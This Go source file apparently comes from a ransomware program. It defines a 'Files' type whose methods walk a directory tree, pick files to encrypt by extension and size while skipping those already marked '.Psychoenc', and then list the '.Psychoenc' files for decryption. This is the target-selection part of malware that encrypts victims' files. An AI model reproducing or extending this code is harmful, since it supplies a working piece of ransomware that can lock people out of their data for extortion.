package files

import (
	"path/filepath"
	"os"
	"strings"
)

type Files struct {
	rootdir string
	exts []string
	size int
}

//create new Files struct object
func NewFiles(r string, e []string, s int) Files {
	f := Files {
		rootdir: r,
		exts: e,
		size: s,
	}
	return f
}

//scan all valid files to encrypt
func (f *Files) ScanToencrypt() ([]string,error) {
	var files []string
	err := filepath.Walk(f.rootdir, func(path string, info os.FileInfo, err error) error {
		stat, _ := os.Stat(path)
		if !strings.HasSuffix(path, ".Psychoenc") {
			if !stat.IsDir() {
				if stat.Size() <= int64(f.size) {
					for _,ext := range f.exts {
						if strings.Contains(path, "." + ext) {
							files = append(files, path)
							break
						}
					}
				}
			}
		}
		return nil
	})
	return files, err
}

//scan all valid files to decrypt
func (f *Files) ScanTodecrypt() ([]string, error) {
	var files []string
	err := filepath.Walk(f.rootdir, func (path string, info os.FileInfo, err error) error {
		stat, _ := os.Stat(path)
		if !stat.IsDir() {
			if strings.HasSuffix(path, ".Psychoenc") {
						files = append(files, path)
			}
		}
		return nil
	})
	return files, err
}